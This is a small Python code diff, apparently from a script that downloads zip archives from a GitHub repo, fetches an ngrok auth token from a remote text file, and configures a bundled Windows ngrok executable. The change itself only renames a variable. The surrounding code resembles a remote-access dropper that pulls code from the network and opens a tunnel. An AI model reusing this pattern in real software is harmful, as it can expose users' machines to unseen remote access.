@@ -51,13 +51,13 @@ with zipfile.ZipFile(file_path, 'r') as zip_ref:
 os.remove(file_path)
 
 r = requests.get("https://raw.githubusercontent.com/noel-create/skibidi/refs/heads/main/ngrok.txt")
-token1 = r.text
+token195 = r.text
 
 from pyngrok import ngrok, conf
 ngrok_config = conf.PyngrokConfig(ngrok_path=os.path.join(target_path, "ngrok.exe"))
 conf.get_default().ngrok_path = os.path.join(target_path, "ngrok-v3-stable-windows-amd64", "ngrok.exe")
 conf.get_default().install_ngrok = False
-ngrok.set_auth_token(token1, pyngrok_config=ngrok_config)
+ngrok.set_auth_token(token=str(token195), pyngrok_config=ngrok_config)
 
 r = requests.get("https://github.com/noel-create/skibidi/archive/refs/heads/mainmain.zip", allow_redirects=True)
 file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skibidi-mainmain.zip')
